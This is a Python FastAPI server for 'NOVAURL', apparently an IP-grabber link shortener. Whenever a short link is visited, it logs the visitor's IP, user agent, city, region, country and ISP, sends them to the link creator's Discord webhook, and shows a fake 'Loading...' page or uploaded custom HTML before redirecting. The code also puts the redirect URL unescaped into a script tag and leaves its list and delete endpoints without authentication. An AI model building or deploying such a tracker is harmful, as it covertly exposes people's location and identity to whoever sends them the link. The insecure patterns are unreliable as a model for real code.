from fastapi import FastAPI, APIRouter, Request, HTTPException, UploadFile, File, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List, Optional
import uuid
from datetime import datetime, timezone
import string
import random
import httpx
import json

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Models
class URLCreate(BaseModel):
    redirect_url: str
    discord_webhook: str
    short_code: Optional[str] = None

class URLRecord(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    short_code: str
    redirect_url: str
    discord_webhook: str
    custom_html: Optional[str] = None
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
    click_count: int = 0

class VisitorData(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    short_code: str
    ip_address: str
    user_agent: Optional[str] = None
    timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
    geolocation: Optional[dict] = None

def generate_short_code(length=8):
    """Generate a random short code for URLs"""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

async def get_ip_geolocation(ip: str):
    """Get geolocation data for IP address"""
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(f"http://ip-api.com/json/{ip}")
            if response.status_code == 200:
                return response.json()
    except Exception as e:
        logging.error(f"Failed to get geolocation for {ip}: {e}")
    return None

async def send_discord_webhook(webhook_url: str, short_code: str, visitor_data: dict):
    """Send visitor data to Discord webhook"""
    try:
        embed = {
            "title": "New URL Visit",
            "color": 0x7289DA,
            "author": {
                "name": "NOVAURL"
            },
            "fields": [
                {
                    "name": "Short URL",
                    "value": f"```{os.environ.get('FRONTEND_DOMAIN', 'localhost:3000')}/{short_code}```",
                    "inline": False
                },
                {
                    "name": "IP Address",
                    "value": visitor_data.get('ip_address', 'Unknown'),
                    "inline": True
                },
                {
                    "name": "User Agent",
                    "value": visitor_data.get('user_agent', 'Unknown')[:100] + "..." if len(visitor_data.get('user_agent', '')) > 100 else visitor_data.get('user_agent', 'Unknown'),
                    "inline": False
                }
            ],
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        
        # Add geolocation data if available
        if visitor_data.get('geolocation'):
            geo = visitor_data['geolocation']
            embed['fields'].extend([
                {
                    "name": "Location",
                    "value": f"{geo.get('city', 'Unknown')}, {geo.get('regionName', 'Unknown')}, {geo.get('country', 'Unknown')}",
                    "inline": True
                },
                {
                    "name": "ISP",
                    "value": geo.get('isp', 'Unknown'),
                    "inline": True
                }
            ])

        payload = {
            "embeds": [embed]
        }
        
        async with httpx.AsyncClient() as client:
            response = await client.post(webhook_url, json=payload)
            if response.status_code != 204:
                logging.error(f"Discord webhook failed: {response.status_code} - {response.text}")
            
    except Exception as e:
        logging.error(f"Failed to send Discord webhook: {e}")

@api_router.post("/urls", response_model=URLRecord)
async def create_url(
    redirect_url: str = Form(...),
    discord_webhook: str = Form(...),
    custom_html: UploadFile = File(None)
):
    """Create a new short URL"""
    # Generate unique short code
    short_code = generate_short_code()
    
    # Check if code already exists (very unlikely but good practice)
    while await db.urls.find_one({"short_code": short_code}):
        short_code = generate_short_code()
    
    # Read custom HTML if provided
    html_content = None
    if custom_html and custom_html.filename:
        if not custom_html.filename.endswith('.html'):
            raise HTTPException(status_code=400, detail="Only HTML files are allowed")
        content = await custom_html.read()
        html_content = content.decode('utf-8')
    
    # Create URL record
    url_record = URLRecord(
        short_code=short_code,
        redirect_url=redirect_url,
        discord_webhook=discord_webhook,
        custom_html=html_content
    )
    
    # Save to database
    await db.urls.insert_one(url_record.dict())
    
    # Send creation notification to Discord
    try:
        embed = {
            "title": "New Short URL Created",
            "color": 0x00FF00,
            "author": {
                "name": "NOVAURL"
            },
            "fields": [
                {
                    "name": "Short URL",
                    "value": f"```{os.environ.get('FRONTEND_DOMAIN', 'localhost:3000')}/{short_code}```",
                    "inline": False
                },
                {
                    "name": "Redirects to",
                    "value": redirect_url,
                    "inline": False
                }
            ],
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        
        payload = {"embeds": [embed]}
        
        async with httpx.AsyncClient() as client:
            await client.post(discord_webhook, json=payload)
            
    except Exception as e:
        logging.error(f"Failed to send creation webhook: {e}")
    
    return url_record

@api_router.get("/urls", response_model=List[URLRecord])
async def get_urls():
    """Get all URLs for management"""
    urls = await db.urls.find().to_list(1000)
    return [URLRecord(**url) for url in urls]

@api_router.delete("/urls/{short_code}")
async def delete_url(short_code: str):
    """Delete a short URL"""
    result = await db.urls.delete_one({"short_code": short_code})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="URL not found")
    return {"message": "URL deleted successfully"}

# Non-API route for short URL handling
@app.get("/{short_code}")
async def handle_short_url(short_code: str, request: Request):
    """Handle short URL visits and redirect"""
    # Find URL record
    url_record = await db.urls.find_one({"short_code": short_code})
    if not url_record:
        raise HTTPException(status_code=404, detail="URL not found")
    
    # Get visitor information
    client_ip = request.client.host
    if 'x-forwarded-for' in request.headers:
        client_ip = request.headers['x-forwarded-for'].split(',')[0].strip()
    elif 'x-real-ip' in request.headers:
        client_ip = request.headers['x-real-ip']
    
    user_agent = request.headers.get('user-agent', '')
    
    # Get geolocation data
    geo_data = await get_ip_geolocation(client_ip)
    
    # Store visitor data
    visitor_data = VisitorData(
        short_code=short_code,
        ip_address=client_ip,
        user_agent=user_agent,
        geolocation=geo_data
    )
    
    await db.visitors.insert_one(visitor_data.dict())
    
    # Update click count
    await db.urls.update_one(
        {"short_code": short_code},
        {"$inc": {"click_count": 1}}
    )
    
    # Send to Discord webhook
    await send_discord_webhook(
        url_record['discord_webhook'],
        short_code,
        {
            'ip_address': client_ip,
            'user_agent': user_agent,
            'geolocation': geo_data
        }
    )
    
    # Show custom HTML or default loading page
    if url_record.get('custom_html'):
        # Add auto-redirect script to custom HTML
        html_with_redirect = url_record['custom_html'].replace(
            '</body>',
            f'<script>setTimeout(() => {{ window.location.href = "{url_record["redirect_url"]}"; }}, 3000);</script></body>'
        )
        return HTMLResponse(content=html_with_redirect)
    else:
        # Default loading page
        default_html = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Loading...</title>
            <style>
                body {{
                    margin: 0;
                    padding: 0;
                    background: white;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                }}
                .loading {{
                    text-align: center;
                }}
                .spinner {{
                    border: 4px solid #f3f3f3;
                    border-top: 4px solid #007bff;
                    border-radius: 50%;
                    width: 40px;
                    height: 40px;
                    animation: spin 1s linear infinite;
                    margin: 0 auto 20px;
                }}
                @keyframes spin {{
                    0% {{ transform: rotate(0deg); }}
                    100% {{ transform: rotate(360deg); }}
                }}
                h1 {{
                    color: #333;
                    font-size: 24px;
                    margin: 0;
                }}
            </style>
        </head>
        <body>
            <div class="loading">
                <div class="spinner"></div>
                <h1>Loading...</h1>
            </div>
            <script>
                setTimeout(() => {{
                    window.location.href = "{url_record['redirect_url']}";
                }}, 3000);
            </script>
        </body>
        </html>
        """
        return HTMLResponse(content=default_html)

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()